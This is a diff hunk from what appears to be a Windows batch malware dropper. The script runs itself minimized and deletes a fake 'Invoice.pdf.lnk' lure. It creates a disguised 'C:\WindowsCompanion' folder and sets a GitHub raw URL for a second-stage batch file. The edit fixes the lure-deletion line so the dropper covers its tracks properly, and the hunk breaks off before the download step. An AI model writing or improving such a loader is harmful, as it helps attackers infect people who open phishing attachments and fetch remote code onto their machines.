@@ -6,7 +6,7 @@ if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && 
 
     set ENTRY_FILE_NAME=Invoice.pdf.lnk
     set ENTRY_COMPLETE=%PATH_TO_ENTRY%%ENTRY_FILE_NAME
-    del ENTRY_COMPLETE
+    del "%ENTRY_COMPLETE%"
 
     if not exist "C:\WindowsCompanion" md "C:\WindowsCompanion"    
     set URL_FUX=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat    
